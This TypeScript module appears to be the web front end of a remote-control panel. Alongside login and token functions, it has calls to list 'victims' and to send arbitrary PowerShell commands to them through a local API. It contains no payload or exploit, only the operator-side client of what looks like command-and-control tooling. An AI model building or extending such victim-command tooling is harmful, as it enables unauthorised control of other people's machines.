import axios from "axios";

const API_URL = "http://127.0.0.1:8000/api/v1/";

export const register = (username: string, email: string, password: string) => {
  return axios
    .post(API_URL + "register", {
      username,
      email,
      password,
    })
    .then((response) => {
      if (response.data.accessToken) {
        localStorage.setItem(
          "token",
          JSON.stringify(response.data.accessToken)
        );
      }
      return response;
    });
};

export const login = (username: string, password: string) => {
  return axios
    .post(
      API_URL + "token",
      new URLSearchParams({
        username: username, //gave the values directly for testing
        password: password,
        client_id: "0",
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    )
    .then((response) => {
      console.log(response);
      if (response.data.accessToken) {
        localStorage.setItem(
          "token",
          JSON.stringify(response.data.accessToken)
        );
      }
      return response;
    });
};

export const verifyToken = (token: string) => {
  return axios
    .post(
      API_URL + "verify-token",
      {
        client_id: "0",
        token: token,
      },
      {
        headers: {
          Authorization: "Bearer " + token,
        },
      }
    )
    .then((response) => {
      if (response.status === 401) {
        //localStorage.removeItem("token");
      }
      return response;
    });
};

export const logout = () => {
  localStorage.removeItem("token");
};

export const getVictims = () => {
  return axios.get(API_URL + "clients", {}).then((response) => {
    return response;
  });
};

export const getVictim = (id: string) => {
  return axios.get(API_URL + "clients/" + id, {}).then((response) => {
    return response;
  });
};

export const runVictimCommand = (
  id: string,
  command: string,
  type?: string
) => {
  // Encrypt the command in URL format
  command = encodeURIComponent(command);

  // Example request: http://127.0.0.1:8001/api/v1/clients/119384632345157/command?command_type=powershell&command=pwd
  return axios
    .post(
      API_URL +
        "clients/" +
        id +
        "/command?command_type=" +
        (type ? type : "powershell") +
        "&command=" +
        command,
      {}
    )
    .then((response) => {
      return response;
    });
};
